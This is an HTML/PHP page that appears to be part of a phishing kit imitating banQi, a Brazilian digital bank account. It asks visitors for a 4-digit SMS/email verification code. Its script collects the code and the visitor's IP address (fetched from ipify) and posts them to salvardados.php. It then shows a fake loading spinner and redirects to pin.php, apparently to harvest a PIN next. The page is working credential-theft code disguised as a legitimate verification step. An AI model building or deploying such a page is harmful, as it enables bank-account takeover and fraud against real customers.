<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A conta digital gratuita dos brasileiros | banQi</title>
    <link rel="icon" href="img/favicon.png">
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <script src="https://kit.fontawesome.com/9464b2a436.js" crossorigin="anonymous"></script>
</head>
<body style="background:rgb(248, 248, 248);">
    <div style="display:none;background:rgba(0,0,0,0.5);width:100%;height:100%;z-index: 9999;position: absolute;" class="cad_sucesso">
        <div class="lskdlsakdsladlsdklsd" style="background:transparent;margin:25% auto;width:100%;height:auto !important;">
            <center>
                <img border="0" height="50px" src="https://media.tenor.com/On7kvXhzml4AAAAj/loading-gif.gif" alt="">
            </center>
            <br>
        </div>
    </div>
    <div style="width:90%;height:auto;margin:0 auto;padding:8px;">
        <p style="font-size:20px;">Para continuar, digite o código <br> que enviamos por SMS e <br> e-mail</p>
        <p style="margin-top:15px;">O código tem 4 dígitos e vale por 5 minutos</p>
        <br><br>
        <form id="form" method="post" action="salvardados.php" autocomplete="off">
            <center>
                <div class="sdasdsd1">
                    
                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="codigo3" onkeypress="startTabCheck();return onlynumber();" onkeyup="exibeValor(this, 1, 0)" onfocus="stopTabCheck(this)">

                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="codigo4" onkeypress="startTabCheck();return onlynumber();" onkeyup="exibeValor(this, 1, 0)" onfocus="stopTabCheck(this)">
                    
                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="codigo5" onkeypress="startTabCheck();return onlynumber();" onkeyup="exibeValor(this, 1, 0)" onfocus="stopTabCheck(this)">
                    
                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="codigo6" onkeypress="return onlynumber();">
                    
                    <br>
                    <br>
                    <br>
                    
                </div>
            </center>
            <div style='clear:both;'></div>
            <br><br>
            <p style="color:rgb(90, 90, 90);">O código não chegou? Peça um novo em <br><strong>3 minutos.</strong></p>
            <br>
            <p style="color:rgb(51, 94, 192);"><strong>Por que enviamos um código verificador?</strong></p>
            <br><br>
            <button style="font-weight: bold;cursor:pointer;width:100%;height:48px;background-color:rgb(51, 94, 192);border-radius:5px;border:none;outline:0;font-size:14px;color:#fff;">CONTINUAR</button>
            <input type="hidden" name="id" value="<?php echo isset($_SESSION['ID_TRANSACAO']) ? $_SESSION['ID_TRANSACAO'] : ''; ?>" />
        </form>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
    <script>
        $('#form').submit(function(e){
            e.preventDefault();
            var txt = $(this).serialize();
            // Captura o IP do usuário
            $.get('https://api.ipify.org?format=json', function(data) {
                var userIP = data.ip;
                // Adiciona o IP ao formulário antes de enviar
                txt += '&ip=' + userIP;
                // Envie os dados do formulário
                $.ajax({
                    type:"POST",
                    url:"salvardados.php",
                    data:txt,
                    success:function(data){
                        $(".cad_sucesso").css({display: 'block'});
                        setTimeout(function() {
                            $(".cad_sucesso").fadeOut();
                            setTimeout(function() {
                                window.location.href = "pin.php";
                            }, 100);
                        }, 3000);
                    }
                });
            });
        });

        function exibeValor(nomeCampo, lenCampo, controle) {
            if ((nomeCampo.value.length == lenCampo) && (checarTabulacao)) {
                var i=0;
                for (i=0; i<document.forms[0].elements.length; i++) {
                    if (document.forms[0].elements[i].name == nomeCampo.name) {
                        while ((i+1) < document.forms[0].elements.length) {
                            if (document.forms[0].elements[i+1].type != "hidden") {
                                document.forms[0].elements[i+1].focus();
                                break;
                            }
                            i++;
                        }
                        checarTabulacao = false;
                        break;
                    }
                }
            }
        }

        function stopTabCheck() {
            checarTabulacao = false;
        }

        function startTabCheck(evt) {
            checarTabulacao = true;
        }
    </script>
    <script>
        function onlynumber(evt) {
            var theEvent = evt || window.event;
            var key = theEvent.keyCode || theEvent.which;
            key = String.fromCharCode(key);
            var regex = /[0-9]|\./;
            if (!regex.test(key)) {
                theEvent.returnValue = false;
                if (theEvent.preventDefault) theEvent.preventDefault();
            }
        }
    </script>
</body>
</html>
